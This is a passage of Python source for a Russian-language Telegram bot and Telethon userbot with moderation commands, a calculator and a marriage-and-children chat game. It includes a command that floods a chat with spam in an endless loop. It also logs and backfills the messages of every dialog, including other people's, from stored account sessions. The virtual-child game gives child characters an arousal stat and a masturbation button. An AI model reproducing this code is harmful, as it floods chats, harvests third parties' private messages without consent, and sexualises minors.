                    UNION SELECT user_id, username, first_name, added_at, 'manual' as type FROM manual_users
                    ORDER BY connected_at DESC""")
                return cur.fetchall()
    except: return []

def delete_business_account(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM business_accounts WHERE user_id=%s", (user_id,))
    except: pass

def save_user_info(user_id, username, first_name):
    user_id = int(user_id)
    if first_name: user_names[user_id] = first_name
    un = username.lstrip("@").lower() if username else None
    if un: user_usernames[un] = user_id
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO user_map (user_id, username, first_name) VALUES (%s,%s,%s) ON CONFLICT (user_id) DO UPDATE SET username=COALESCE(EXCLUDED.username,user_map.username), first_name=COALESCE(EXCLUDED.first_name,user_map.first_name)", (user_id, un, first_name))
    except: pass

def set_user_ban(user_id, ban):
    user_id = int(user_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if ban:
                    cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
                    banned_users.add(user_id)
                else:
                    cur.execute("DELETE FROM banned_users WHERE user_id=%s", (user_id,))
                    banned_users.discard(user_id)
    except: pass

def save_setting(chat_id, stype, enabled):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if enabled: cur.execute("INSERT INTO chat_settings (chat_id, setting_type) VALUES (%s,%s) ON CONFLICT DO NOTHING", (chat_id, stype))
                else: cur.execute("DELETE FROM chat_settings WHERE chat_id=%s AND setting_type=%s", (chat_id, stype))
        target = link_chats if stype == 'enabled_links' else (reply_guard_chats if stype == 'reply_guard' else typing_disabled_chats)
        target.add(chat_id) if enabled else target.discard(chat_id)
    except: pass

def save_substitution(chat_id, text, mode):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if text is None:
                    cur.execute("DELETE FROM substitutions WHERE chat_id=%s", (chat_id,))
                    substitutions.pop(chat_id, None)
                else:
                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s,%s,%s) ON CONFLICT (chat_id) DO UPDATE SET text=EXCLUDED.text, mode=EXCLUDED.mode", (chat_id, text, mode))
                    substitutions[chat_id] = {"text": text, "mode": mode}
    except: pass

def save_spam_text(key_id, text):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s,%s) ON CONFLICT (key_id) DO UPDATE SET text=EXCLUDED.text", (str(key_id), text))
        user_spam_texts[str(key_id)] = text
    except: pass

def get_user_mention(user_id, fallback_name=None):
    user_id = int(user_id)
    fn = user_names.get(user_id) or fallback_name or "Пользователь"
    return f'<a href="tg://user?id={user_id}">{fn}</a>'

def extract_media_info(msg):
    """Для Telethon Message → (media_type, has_media)."""
    if not msg: return None, False
    try:
        from telethon.tl.types import (
            MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage,
            MessageMediaGeo, MessageMediaGeoLive, MessageMediaContact,
            MessageMediaPoll, MessageMediaDice)
        m = getattr(msg, "media", None)
        if not m: return None, False
        if isinstance(m, MessageMediaPhoto): return "photo", True
        if isinstance(m, MessageMediaDocument):
            d = m.document
            mime = (getattr(d, "mime_type", "") or "").lower() if d else ""
            attrs = getattr(d, "attributes", []) or []
            is_sticker = any(getattr(a, "sticker", False) for a in attrs)
            if is_sticker: return "sticker", True
            if mime.startswith("video"): return "video", True
            if mime.startswith("audio"): return "audio", True
            if mime.startswith("image"): return "photo", True
            return "document", True
        if isinstance(m, MessageMediaWebPage): return "webpage", True
        if isinstance(m, MessageMediaGeo): return "geo", True
        if isinstance(m, MessageMediaGeoLive): return "geo_live", True
        if isinstance(m, MessageMediaContact): return "contact", True
        if isinstance(m, MessageMediaPoll): return "poll", True
        if isinstance(m, MessageMediaDice): return "dice", True
    except Exception as e:
        logging.debug(f"extract_media_info: {e}")
    return "unknown", True

def save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username,
                     text, message_id, media_type=None, has_media=False):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""INSERT INTO chat_messages
                    (user_id, chat_id, sender_id, sender_name, sender_username,
                     text, message_id, media_type, has_media)
                    VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)
                    ON CONFLICT DO NOTHING""",
                    (int(user_id), int(chat_id),
                     int(sender_id) if sender_id else 0,
                     sender_name, sender_username, (text or "")[:2000],
                     int(message_id), media_type, bool(has_media)))
                ins = cur.rowcount
        if ins: msg_count_cache[user_id] = msg_count_cache.get(user_id, 0) + 1
        return bool(ins)
    except Exception as e:
        logging.debug(f"save_chat_message: {e}")
        return False

def get_chat_messages(user_id, chat_id, page=0, per_page=15):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT sender_id, sender_name, sender_username, text, created_at FROM chat_messages WHERE user_id=%s AND chat_id=%s ORDER BY id DESC LIMIT %s OFFSET %s", (user_id, chat_id, per_page, page * per_page))
                rows = cur.fetchall()
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                return list(reversed(rows)), cur.fetchone()[0]
    except: return [], 0

def get_chat_media(user_id, chat_id, media_type=None, limit=500):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                q = ("SELECT message_id, media_type, sender_id, sender_name, created_at "
                     "FROM chat_messages WHERE user_id=%s AND chat_id=%s AND has_media=TRUE")
                params = [user_id, chat_id]
                if media_type:
                    q += " AND media_type=%s"; params.append(media_type)
                q += " ORDER BY message_id DESC LIMIT %s"; params.append(limit)
                cur.execute(q, params)
                return cur.fetchall()
    except Exception as e:
        logging.debug(f"get_chat_media: {e}")
        return []

def count_chat_media(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s AND has_media=TRUE",
                            (user_id, chat_id))
                return cur.fetchone()[0]
    except: return 0

def clear_chat_messages(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
        msg_count_cache.pop(user_id, None)
    except: pass

def save_spouse(chat_id, owner_id, spouse_id, spouse_name, relation):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO chat_spouses (chat_id, owner_id, spouse_id, spouse_name, relation) VALUES (%s,%s,%s,%s,%s) ON CONFLICT (chat_id) DO UPDATE SET owner_id=EXCLUDED.owner_id, spouse_id=EXCLUDED.spouse_id, spouse_name=EXCLUDED.spouse_name, relation=EXCLUDED.relation",
                            (chat_id, owner_id, spouse_id, spouse_name, relation))
    except Exception as e: logging.error(f"save_spouse: {e}")

def get_spouse(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT owner_id, spouse_id, spouse_name, relation FROM chat_spouses WHERE chat_id=%s", (chat_id,))
                r = cur.fetchone()
                if not r: return None
                return {"owner_id": int(r[0]), "spouse_id": int(r[1]), "spouse_name": r[2], "relation": r[3]}
    except: return None

def delete_spouse(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM chat_spouses WHERE chat_id=%s", (chat_id,))
    except: pass

CHILD_COLS = "id, chat_id, owner_id, spouse_id, name, gender, health, hunger, toilet, sleep_need, hygiene, mood, attention, libido, birth_date, created_at, last_birthday_year"
CHILD_KEYS = ["id","chat_id","owner_id","spouse_id","name","gender","health","hunger","toilet","sleep_need","hygiene","mood","attention","libido","birth_date","created_at","last_birthday_year"]

def get_children_by_chat(chat_id, alive_only=True):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if alive_only:
                    cur.execute(f"SELECT {CHILD_COLS} FROM children WHERE chat_id=%s AND is_alive=TRUE ORDER BY id", (chat_id,))
                else:
                    cur.execute(f"SELECT {CHILD_COLS} FROM children WHERE chat_id=%s ORDER BY id", (chat_id,))
                return [dict(zip(CHILD_KEYS, r)) for r in cur.fetchall()]
    except Exception as e:
        logging.error(f"get_children_by_chat: {e}"); return []

def _resolve_children_chat_id(message_or_cb):
    try: return int(message_or_cb.chat.id)
    except AttributeError:
        try: return int(message_or_cb.message.chat.id)
        except: return None

def create_child(chat_id, owner_id, spouse_id, name, gender):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO children (chat_id, owner_id, spouse_id, name, gender) VALUES (%s,%s,%s,%s,%s) RETURNING id, birth_date, created_at", (chat_id, owner_id, spouse_id, name, gender))
                cid, bd, ca = cur.fetchone()
                return {"id": cid, "chat_id": chat_id, "name": name, "gender": gender, "birth_date": bd, "created_at": ca}
    except Exception as e:
        logging.error(f"create_child: {e}"); return None

def update_child_field(child_id, field, value):
    value = max(0, min(100, value))
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(f"UPDATE children SET {field}=%s WHERE id=%s", (value, child_id))
    except: pass

def update_child_full(child_id, health, needs, libido):
    health = max(0, min(100, health)); needs = {k: max(0, min(100, v)) for k, v in needs.items()}
    libido = max(0, min(100, libido))
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET health=%s,hunger=%s,toilet=%s,sleep_need=%s,hygiene=%s,mood=%s,attention=%s,libido=%s WHERE id=%s",
                            (health, needs["hunger"], needs["toilet"], needs["sleep_need"], needs["hygiene"], needs["mood"], needs["attention"], libido, child_id))
    except: pass

def kill_child(child_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET is_alive=FALSE WHERE id=%s", (child_id,))
    except: pass

def delete_child(child_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM children WHERE id=%s", (child_id,))
    except: pass

def get_all_alive_children_full():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(f"SELECT {CHILD_COLS} FROM children WHERE is_alive=TRUE")
                return [dict(zip(CHILD_KEYS, r)) for r in cur.fetchall()]
    except: return []

def set_last_birthday_year(child_id, year):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET last_birthday_year=%s WHERE id=%s", (year, child_id))
    except: pass

def get_game_age(birth_date):
    if isinstance(birth_date, datetime): birth_date = birth_date.date()
    rd = (datetime.now(timezone.utc).date() - birth_date).days
    gd = (rd / GAME_YEAR_IN_REAL_DAYS) * 365
    return int(gd // 365), int((gd % 365) // 30)

def age_stage_word(y):
    if y < 1: return "младенец 👶"
    if y < 5: return "малыш 🧒"
    if y < 12: return "ребёнок 🧒"
    return "подросток 🧑"

def bar(v, length=10):
    f = round(v / 100 * length); return "▓" * f + "░" * (length - f)

def existed_time_detailed(created_at):
    if not created_at: return "?", "?"
    if isinstance(created_at, str):
        try: created_at = datetime.fromisoformat(created_at)
        except: return "?", "?"
    if created_at.tzinfo is None: created_at = created_at.replace(tzinfo=timezone.utc)
    delta = datetime.now(timezone.utc) - created_at
    ts = int(delta.total_seconds())
    if ts < 0: ts = 0
    m = ts // 60; h = m // 60; d = h // 24; w = d // 7; mo = d // 30; y = d // 365
    parts = []
    if y: parts.append(f"{y} г.")
    if mo % 12: parts.append(f"{mo % 12} мес.")
    if w % 4 and not y: parts.append(f"{w % 4} нед.")
    if d % 7 and not y: parts.append(f"{d % 7} дн.")
    if h % 24: parts.append(f"{h % 24} ч.")
    if m % 60: parts.append(f"{m % 60} мин.")
    if not parts: parts.append(f"{ts} сек.")
    return " ".join(parts), created_at.astimezone(timezone.utc).strftime("%d.%m.%Y %H:%M UTC")

def child_status_text(child):
    y, m = get_game_age(child["birth_date"])
    gw = "Сын" if child["gender"] == "m" else "Дочь"
    lines = [f"👶 {gw}: {child['name']} — {y} г. {m} мес. ({age_stage_word(y)})",
             f"❤️ Здоровье:  {bar(child['health'])} {child['health']}"]
    for k in NEEDS:
        lb, em = NEED_LABELS[k]
        lines.append(f"{em} {lb}: {bar(child[k])} {child[k]}")
    lib = child.get("libido", 0)
    lines.append(f"🔥 Возбуждение: {bar(lib)} {lib}")
    return "\n".join(lines)

def child_action_keyboard(child_id, highlight=None):
    rows, pair = [], []
    for k in NEEDS:
        t = ACTION_LABELS[k]
        if k == highlight: t = "👉 " + t
        pair.append(InlineKeyboardButton(text=t, callback_data=f"child_{k}_{child_id}"))
        if len(pair) == 2: rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="💊 Полечить", callback_data=f"child_heal_{child_id}")])
    rows.append([InlineKeyboardButton(text="🍆 Подрочить", callback_data=f"child_jerk_{child_id}")])
    rows.append([InlineKeyboardButton(text="☠️ Убить", callback_data=f"kill_{child_id}")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def birth_rules_text(name, gender, birth_date):
    gw = "него" if gender == "m" else "неё"; pa = "его" if gender == "m" else "её"
    bw = "родился" if gender == "m" else "родилась"; ww = "Сын" if gender == "m" else "Дочь"
    ds = birth_date.strftime("%d.%m.%Y") if hasattr(birth_date, "strftime") else str(birth_date)
    return (f"🎉 Поздравляю, {bw} {ww.lower()} — {name}!\nДень рождения: {ds}\n\n"
            + BIRTH_RULES_TEXT.format(gender_word_small=gw, pronoun_acc=pa, who_word=ww.lower()))

async def delete_msg(chat_id, msg_id, bc_id):
    if bc_id:
        try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[msg_id]); return
        except: pass
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def edit_message(chat_id, msg_id, text, bc_id, parse_mode=None):
    try:
        kw = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
        if bc_id: kw["business_connection_id"] = bc_id
        await bot.edit_message_text(**kw); return True
    except: return False

async def clear_cmd(chat_id, msg_id, bc_id):
    await delete_msg(chat_id, msg_id, bc_id)

async def global_typing_loop():
    while True:
        try:
            for bc_id, chats in list(active_chats.items()):
                for cid in list(chats)[-50:]:
                    if cid not in typing_disabled_chats:
                        try: await bot.send_chat_action(chat_id=cid, action="typing", business_connection_id=bc_id)
                        except: pass
        except: pass
        await asyncio.sleep(4)

async def spam_worker_bot(chat_id, bc_id, reply_to, text):
    try:
        words = text.split()
        while True:
            for w in words:
                kw = {"chat_id": chat_id, "text": w}
                if bc_id: kw["business_connection_id"] = bc_id
                if reply_to: kw["reply_to_message_id"] = reply_to
                try: await bot.send_message(**kw)
                except asyncio.CancelledError: raise
                except Exception as e: logging.warning(f"spam send: {e}")
                await asyncio.sleep(0.3)
    except asyncio.CancelledError:
        logging.info(f"🛑 spam_bot stopped chat={chat_id}"); raise

async def spam_worker_telethon(client, chat_id, text):
    try:
        words = text.split()
        while True:
            for w in words:
                try: await client.send_message(chat_id, w)
                except asyncio.CancelledError: raise
                except: pass
                await asyncio.sleep(0.4)
    except asyncio.CancelledError:
        logging.info(f"🛑 spam_telethon stopped chat={chat_id}"); raise

async def unmute(user_id, chat_id, bc_id, user_name):
    if user_id in mutes:
        try: await asyncio.sleep((mutes[user_id]["until"] - datetime.now()).total_seconds())
        except: pass
        if user_id in mutes and datetime.now() >= mutes[user_id]["until"]:
            mutes.pop(user_id, None)
            kw = {"chat_id": chat_id, "text": f"🔊 С {get_user_mention(user_id, user_name)} снят <b>МУТ</b>.", "parse_mode": "HTML"}
            if bc_id: kw["business_connection_id"] = bc_id
            try: await bot.send_message(**kw)
            except: pass

def calculate_expression(expr):
    try:
        e = expr.replace(" ", "")
        if not re.match(r'^[\d+\-*/()%**sqrt.]+$', e): return None, "❌ Некорректно"
        e = e.replace("sqrt", "math.sqrt")
        r = eval(e, {"math": math, "__builtins__": None})
        if r is None: return None, "❌ Ошибка"
        if isinstance(r, float): r = int(r) if r.is_integer() else round(r, 10)
        return r, None
    except ZeroDivisionError: return None, "❌ Деление на ноль!"
    except Exception as ex: return None, f"❌ {ex}"

def is_calc_expr(text):
    if not text: return False
    c = text.replace(" ", "")
    if not re.search(r"\d", c): return False
    if not re.search(r"[+\-*/%]", c): return False
    if not re.fullmatch(r"[\d\.\+\-\*/\(\)%]+", c): return False
    if re.fullmatch(r"[\+\-\*/%\.]+", c): return False
    return True

def apply_modifications(text, chat_id, entities=None):
    ft = text; modified = False
    if chat_id in substitutions:
        s = substitutions[chat_id]
        ft = f"{s['text']} {text}" if s["mode"] == 1 else f"{text} {s['text']}"
        modified = True
    if chat_id in link_chats and CHANNEL_LINK:
        has_link = False
        if entities:
            for e in entities:
                et = getattr(e, 'type', None) or type(e).__name__
                if et in ("url", "text_link", "MessageEntityUrl", "MessageEntityTextUrl"):
                    has_link = True; break
        if not has_link and CHANNEL_LINK not in ft:
            ft = f'<a href="{CHANNEL_LINK}">{ft}</a>'
            modified = True
    return ft, modified

async def process_command_text(text, owner_id, chat_id, bc_id=None, telethon_client=None,
                               telethon_event=None, send_reply=None, aiogram_message=None,
                               in_private_bot=False):
    global CHANNEL_LINK
    low = text.lower().strip()

    if low == ".стоп": save_setting(chat_id, 'enabled_links', False); return True
    if low == ".старт": save_setting(chat_id, 'enabled_links', True); return True
    if low.startswith("+линк"):
        p = text.split(maxsplit=1)
        if len(p) > 1:
            nl = p[1].strip()
            if not nl.startswith("http"): nl = "https://t.me/" + nl.lstrip("@")
            CHANNEL_LINK = nl
        return True
    if low.startswith("подмена"):
        p = text.split(maxsplit=2)
        if len(p) == 1: return True
        if p[1].lower() == "выкл": save_substitution(chat_id, None, None)
        else:
            mode = int(p[2]) if len(p) == 3 and p[2] in ["1","2"] else 1
            save_substitution(chat_id, p[1], mode)
        return True
    if low == "печать -": save_setting(chat_id, 'typing_disabled', True); return True
    if low == "печать +": save_setting(chat_id, 'typing_disabled', False); return True
    if low == "+реплай": save_setting(chat_id, 'reply_guard', True); return True
    if low == "-реплай": save_setting(chat_id, 'reply_guard', False); return True

    if low == "ss":
        t = user_spam_texts.get(str(owner_id))
        if not t:
            if send_reply:
                try: await send_reply("⚠️ Сначала: set [текст]")
                except: pass
            return True
        for item in list(active_spam_tasks):
            if item[0] == chat_id:
                try: item[2].cancel()
                except: pass
                active_spam_tasks.remove(item)
        if telethon_client:
            task = asyncio.create_task(spam_worker_telethon(telethon_client, chat_id, t))
        else:
            rt = None
            if aiogram_message and aiogram_message.reply_to_message:
                rt = aiogram_message.reply_to_message.message_id
            task = asyncio.create_task(spam_worker_bot(chat_id, bc_id, rt, t))
        active_spam_tasks.append((chat_id, owner_id, task))
        return True

    if low == "dd":
        killed = 0
        for item in list(active_spam_tasks):
            if item[0] == chat_id:
                try: item[2].cancel()
                except: pass
                active_spam_tasks.remove(item); killed += 1
        if in_private_bot:
            for item in list(active_spam_tasks):
                if item[1] == owner_id:
                    try: item[2].cancel()
                    except: pass
                    active_spam_tasks.remove(item); killed += 1
        return True

    if low.startswith("set "):
        save_spam_text(str(owner_id), text[4:].strip())
        if in_private_bot and send_reply:
            try: await send_reply("✅ Текст сохранён.")
            except: pass
        return True

    if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
        m = re.search(r"\d+", text)
        if not m:
            if send_reply:
                try: await send_reply("Формат: .мут 10")
                except: pass
            return True
        mins = int(m.group()); target_id, target_name = None, None
        if telethon_event and telethon_event.is_reply:
            try:
                rp = await telethon_event.get_reply_message(); s = await rp.get_sender()
                target_id = s.id; target_name = getattr(s, "first_name", None) or "Юзер"
            except: pass
        elif aiogram_message and aiogram_message.reply_to_message and aiogram_message.reply_to_message.from_user:
            tu = aiogram_message.reply_to_message.from_user
            target_id = tu.id; target_name = tu.first_name or "Юзер"
        if not target_id and bc_id and aiogram_message and aiogram_message.chat.type == "private":
            target_id = chat_id
            target_name = user_names.get(chat_id) or (aiogram_message.chat.first_name) or "Собеседник"
        if not target_id:
            if send_reply:
                try: await send_reply("Ответь реплаем.")
                except: pass
            return True
        mutes[target_id] = {"until": datetime.now() + timedelta(minutes=mins)}
        asyncio.create_task(unmute(target_id, chat_id, bc_id, target_name))
        msg = f"🔇 {target_name} — МУТ {mins} мин."
        if send_reply:
            try: await send_reply(msg)
            except: pass
        return True

    if low in [".размут", "!размут"]:
        target_id = None; target_name = None
        if telethon_event and telethon_event.is_reply:
            try:
                rp = await telethon_event.get_reply_message(); s = await rp.get_sender()
                target_id = s.id; target_name = getattr(s, "first_name", None) or "Юзер"
            except: pass
        elif aiogram_message and aiogram_message.reply_to_message and aiogram_message.reply_to_message.from_user:
            tu = aiogram_message.reply_to_message.from_user
            target_id = tu.id; target_name = tu.first_name or "Юзер"
        if not target_id and bc_id and aiogram_message and aiogram_message.chat.type == "private":
            target_id = chat_id
            target_name = user_names.get(chat_id) or (aiogram_message.chat.first_name) or "Собеседник"
        if not target_id:
            if send_reply:
                try: await send_reply("Ответь реплаем.")
                except: pass
            return True
        mutes.pop(target_id, None)
        if send_reply:
            try: await send_reply(f"🔊 {target_name} — МУТ снят.")
            except: pass
        return True

    if low in ["мой ид", "моид"]:
        try:
            if send_reply: await send_reply(f"🆔 {owner_id}")
            else: await bot.send_message(chat_id, f"🆔 <code>{owner_id}</code>", parse_mode="HTML", business_connection_id=bc_id)
        except: pass
        return True
    if low in ["твой ид", "твоид"]:
        target_id = None
        if telethon_event and telethon_event.is_reply:
            try:
                rp = await telethon_event.get_reply_message(); s = await rp.get_sender()
                target_id = s.id
            except: pass
        elif aiogram_message and aiogram_message.reply_to_message and aiogram_message.reply_to_message.from_user:
            target_id = aiogram_message.reply_to_message.from_user.id
        if target_id and send_reply:
            try: await send_reply(f"🆔 {target_id}")
            except: pass
        return True
    if low == "!команды":
        try:
            if send_reply:
                plain = TEXT_COMMANDS_HELP.replace("<b>","").replace("</b>","").replace("<code>","").replace("</code>","")
                await send_reply(plain)
            else: await bot.send_message(chat_id, TEXT_COMMANDS_HELP, parse_mode="HTML", business_connection_id=bc_id)
        except: pass
        return True
    return False

async def extract_sender_info(message):
    sid, sname, suname = 0, "Unknown", ""
    try:
        s = await message.get_sender()
        if s:
            sid = int(getattr(s, 'id', 0) or 0)
            sname = getattr(s, 'first_name', None) or getattr(s, 'title', None) or "Unknown"
            suname = getattr(s, 'username', '') or ''
    except: pass
    if not sid:
        try: sid = int(getattr(message, 'sender_id', 0) or 0)
        except: pass
    return sid, sname, suname

async def backfill_one_chat(client, user_id, chat_id, limit=100):
    saved = 0
    try:
        msgs = await client.get_messages(chat_id, limit=limit)
        for m in msgs:
            if not m: continue
            text = m.text or "[📎 медиа]"
            sid, sn, su = await extract_sender_info(m)
            if sid:
                try: save_user_info(sid, su, sn)
                except: pass
            mt, hm = extract_media_info(m)
            if save_chat_message(user_id, int(chat_id), sid, sn, su, text,
                                 int(m.id), mt, hm):
                saved += 1
    except Exception as e:
        logging.debug(f"backfill_one_chat: {e}")
    return saved

async def backfill_dialogs(client, user_id, max_dialogs=300, per_chat=30):
    try:
        dlgs = []
        async for d in client.iter_dialogs(limit=max_dialogs): dlgs.append(d)
        for d in dlgs:
            try:
                cid = int(d.id); save_user_chat(user_id, cid, d.name or "Чат")
                try: msgs = await client.get_messages(d.entity, limit=per_chat)
                except FloodWaitError as e: await asyncio.sleep(e.seconds + 1); continue
                except: continue
                for m in msgs:
                    if not m: continue
                    text = m.text or "[📎 медиа]"
                    sid, sn, su = await extract_sender_info(m)
                    if sid:
                        try: save_user_info(sid, su, sn)
                        except: pass
                    mt, hm = extract_media_info(m)
                    save_chat_message(user_id, cid, sid, sn, su, text, int(m.id), mt, hm)
                await asyncio.sleep(0.15)
            except: pass
    except: pass

async def process_marriage_telethon(event, client, user_id, chat_id, low):
    if not event.is_reply:
        if low in ["муж","жена","пожениться"]:
            try: await client.send_message(chat_id, "Ответь реплаем.")
            except: pass
        return True
    try:
        rp = await event.get_reply_message(); s = await rp.get_sender()
        sp_id = s.id; sp_name = getattr(s, "first_name", None) or "Партнёр"
        if sp_id == user_id: return True
        if low == "развод":
            delete_spouse(chat_id); return True
        relation = "husband" if low in ["муж","пожениться"] else "wife"
        me_name = user_names.get(user_id, "Пользователь")
        txt = (f"💍 {me_name} предлагает {sp_name} стать мужем." if relation == "husband"
               else f"💍 {me_name} предлагает {sp_name} стать женой.")
        try: await client.send_message(chat_id, txt)
        except: pass
        save_spouse(chat_id, user_id, sp_id, sp_name, relation)
        return True
    except: return True

async def start_telethon_listener(user_id, session_str):
    try:
        client = make_client(session_str)

        @client.on(events.NewMessage(incoming=True))
        async def on_incoming(event):
            try:
                cid = int(event.chat_id) if event.chat_id else None
                if cid is None: return
                text = event.message.text or "[📎 медиа]"
                sid, sn, su = await extract_sender_info(event.message)
                if sid:
                    try: save_user_info(sid, su, sn)
                    except: pass
                mt, hm = extract_media_info(event.message)
                save_chat_message(user_id, cid, sid, sn, su, text, int(event.message.id), mt, hm)
                try:
                    c = await event.get_chat()
                    cname = getattr(c, 'title', None) or getattr(c, 'first_name', None) or "Чат"
                    save_user_chat(user_id, cid, cname)
                except: pass
                if sid in mutes and datetime.now() < mutes[sid]["until"]:
                    try: await event.delete()
                    except: pass
                    return
                if cid in reply_guard_chats and event.is_reply:
                    try: await event.delete()
                    except: pass
                    return
            except: pass

        @client.on(events.NewMessage(outgoing=True))
        async def on_outgoing(event):
            try:
                cid = int(event.chat_id)
                text = event.message.text or ""
                mt, hm = extract_media_info(event.message)
                save_chat_message(user_id, cid, user_id, user_names.get(user_id, "Я"), "",
                                  text or "[📎]", int(event.message.id), mt, hm)
                if event.is_private: return
                try:
                    c = await event.get_chat()
                    cname = getattr(c, 'title', None) or getattr(c, 'first_name', None) or "Чат"
                    save_user_chat(user_id, cid, cname)
                except: pass
                stripped = text.strip()
                if not stripped: return
                low = stripped.lower()

                if is_calc_expr(stripped):
                    r, err = calculate_expression(stripped)
                    if r is not None:
                        f = f"{r:.10f}".rstrip('0').rstrip('.') if isinstance(r, float) else str(r)
                        try: await event.edit(f"{stripped} = {f}")
                        except: pass
                        return

                if low in ["муж", "жена", "пожениться", "развод"]:
                    await process_marriage_telethon(event, client, user_id, cid, low)
                    try: await event.delete()
                    except: pass
                    return

                if low == "dd":
                    for item in list(active_spam_tasks):
                        if item[0] == cid:
                            try: item[2].cancel()
                            except: pass
                            active_spam_tasks.remove(item)
                    try: await event.delete()
                    except: pass
                    return

                m_birth = re.match(r"(?i)^\s*родить\s+(сына|дочь)\s+(.+)$", stripped)
                if m_birth:
                    g = "m" if m_birth.group(1).lower() == "сына" else "f"
                    nm = m_birth.group(2).strip().strip("()[]{}").strip()[:32]
                    kids = get_children_by_chat(cid)
                    if any(k["name"].lower() == nm.lower() for k in kids):
                        try: await client.send_message(cid, f"⚠️ Ребёнок {nm} уже есть.")
                        except: pass
                    else:
                        sp = get_spouse(cid); spouse_id = None
                        if sp:
                            spouse_id = sp["spouse_id"] if sp["owner_id"] == user_id else (sp["owner_id"] if sp["spouse_id"] == user_id else None)
                        ch = create_child(cid, user_id, spouse_id, nm, g)
                        if ch:
                            try:
                                txt = birth_rules_text(ch["name"], ch["gender"], ch["birth_date"])
                                plain = txt.replace("<b>","").replace("</b>","")
                                await client.send_message(cid, plain)
                            except: pass
                    try: await event.delete()
                    except: pass
                    return

                CHILD_STATUS_RE = re.compile(r"(?i)^\s*(?:наш|наша|наше|мо[йяё])\s+(сын|сына|дочь|дочку|дочери|ребёнок|ребенок|ребёнка)(?:\s+([A-Za-zА-Яа-яЁё0-9_\-]+))?\s*$")
                m_status = CHILD_STATUS_RE.match(stripped)
                if m_status:
                    name_arg = m_status.group(2).strip() if m_status.group(2) else None
                    gender_arg = None
                    w = m_status.group(1).lower()
                    if w in ("сын","сына"): gender_arg = "m"
                    elif w in ("дочь","дочку","дочери"): gender_arg = "f"
                    kids = get_children_by_chat(cid)
                    if not kids:
                        try: await client.send_message(cid, "В этом чате нет детей.")
                        except: pass
                    else:
                        filtered = kids
                        if gender_arg: filtered = [k for k in filtered if k["gender"] == gender_arg]
                        if name_arg: filtered = [k for k in filtered if k["name"].lower() == name_arg.lower()]
                        if not filtered:
                            try: await client.send_message(cid, "❌ Не нашёл.")
                            except: pass
                        elif len(filtered) == 1:
                            try:
                                st = child_status_text(filtered[0]).replace("<b>","").replace("</b>","")
                                await client.send_message(cid, st)
                            except: pass
                        else:
                            names = ", ".join(k["name"] for k in filtered[:20])
                            try: await client.send_message(cid, f"Несколько: {names}")
                            except: pass
                    try: await event.delete()
                    except: pass
                    return

                if low.startswith("дата регистрации"):
                    kids = get_children_by_chat(cid)
                    if kids:
                        lines = []
                        for k in kids[:20]:
                            detailed, ds = existed_time_detailed(k.get("created_at"))
                            gw = "Сын" if k["gender"] == "m" else "Дочь"
                            lines.append(f"{gw} {k['name']}: {detailed} (с {ds})")
                        try: await client.send_message(cid, "📅 " + "\n".join(lines))
                        except: pass
                    try: await event.delete()
                    except: pass
                    return

                async def send_reply(msg):
                    try: await client.send_message(cid, msg)
                    except: pass

                handled = await process_command_text(stripped, user_id, cid, bc_id=None,
                                                     telethon_client=client, telethon_event=event, send_reply=send_reply)
                if handled:
                    try: await event.delete()
                    except: pass
                    return

                ft, modified = apply_modifications(stripped, cid, event.message.entities)
                if modified:
                    try: await event.edit(ft, parse_mode='html', link_preview=False)
                    except Exception as e: logging.warning(f"edit mod: {e}")
            except Exception as e: logging.error(f"outgoing: {e}", exc_info=True)

        await client.start()
        telethon_clients[user_id] = client
        try:
            async for d in client.iter_dialogs(limit=300):
                save_user_chat(user_id, int(d.id), d.name or "Чат")
        except: pass
        asyncio.create_task(backfill_dialogs(client, user_id))
        return client
    except Exception as e:
        logging.error(f"start_telethon_listener {user_id}: {e}"); return None

async def restore_all_sessions():
    sessions = get_all_sessions()
    for uid, ss in sessions:
        try: await start_telethon_listener(int(uid), ss)
        except: pass
